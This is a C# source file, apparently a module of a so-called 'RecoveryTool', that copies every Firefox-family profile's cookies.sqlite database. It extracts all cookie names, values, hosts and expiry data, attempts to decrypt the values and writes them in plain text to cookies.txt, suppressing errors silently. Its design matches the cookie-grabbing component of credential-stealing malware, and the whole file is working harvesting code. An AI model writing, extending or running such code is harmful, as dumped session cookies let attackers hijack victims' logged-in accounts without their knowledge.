using Microsoft.Data.Sqlite;
using System.Text;

namespace RecoveryTool.Recovery.Browsers.Gecko
{
    public static class GeckoCookies
    {
        public static async Task RecoverAsync(string browserName, string browserRelativePath)
        {
            await GeckoCommon.RecoverDataAsync(browserName, "Cookies", ProcessProfileAsync, "cookies.txt");
        }

        private static async Task<string> ProcessProfileAsync(string profilePath)
        {
            var sb = new StringBuilder();
            string cookiesDbPath = Path.Combine(profilePath, "cookies.sqlite");
            if (!File.Exists(cookiesDbPath))
            {
                return string.Empty;
            }

            string tempDbPath = await GeckoCommon.CopyDatabaseToTempAsync(cookiesDbPath, "cookies");
            if (string.IsNullOrEmpty(tempDbPath)) return string.Empty;

            try
            {
                using var connection = await GeckoCommon.OpenSqliteConnectionAsync(tempDbPath);
                string query = @"
                        SELECT 
                            name, 
                            value, 
                            host, 
                            path, 
                            expiry, 
                            lastAccessed
                        FROM 
                            moz_cookies
                        ORDER BY 
                            lastAccessed DESC;";

                using var command = new SqliteCommand(query, connection);
                using var reader = await command.ExecuteReaderAsync();
                while (await reader.ReadAsync())
                {
                    string name = reader["name"] as string ?? "Unnamed";
                    string valueEncrypted = reader["value"] as string ?? string.Empty;
                    string host = reader["host"] as string ?? "Unknown Host";
                    string path = reader["path"] as string ?? "/";
                    long expiry = reader["expiry"] != DBNull.Value ? Convert.ToInt64(reader["expiry"]) : 0;
                    long lastAccessed = reader["lastAccessed"] != DBNull.Value ? Convert.ToInt64(reader["lastAccessed"]) : 0;
                    string value;
                    try
                    {
                        value = await GeckoCommon.DecryptAsync(valueEncrypted);
                    }
                    catch
                    {
                        value = valueEncrypted;
                    }
                    var expiryDate = GeckoCommon.UnixTimeStampToDateTime(expiry);
                    var lastAccessedDt = GeckoCommon.UnixTimeStampToDateTime(lastAccessed / 1000);
                    sb.AppendLine($"Name: {name}");
                    sb.AppendLine($"Value: {value}");
                    sb.AppendLine($"Host: {host}");
                    sb.AppendLine($"Path: {path}");
                    sb.AppendLine($"Expiry: {expiryDate}");
                    sb.AppendLine($"Last Accessed: {lastAccessedDt}");
                    sb.AppendLine(new string('-', 50));
                }
            }
            catch
            {
                return string.Empty;
            }
            return sb.ToString();
        }
    }
}
